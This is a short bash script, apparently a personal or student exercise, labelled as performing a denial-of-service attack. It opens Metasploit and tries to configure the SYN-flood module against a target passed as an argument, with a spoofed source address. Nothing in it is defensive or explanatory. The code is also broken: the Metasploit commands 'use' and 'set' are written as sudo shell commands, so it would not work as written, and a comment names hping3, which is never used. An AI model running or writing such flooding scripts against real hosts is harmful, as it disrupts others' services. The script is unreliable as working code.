#!/bin/bash

# Ceci est un commentaire
echo "*** christian: performing DoS attack 3 ***"

sudo msfconsole

sudo use auxiliary/dos/tcp/synflood

# hping3 for the attacks
function attack() {
    sudo set rhost $1 
    sudo set shost 192.168.1.111 
}


attack $1
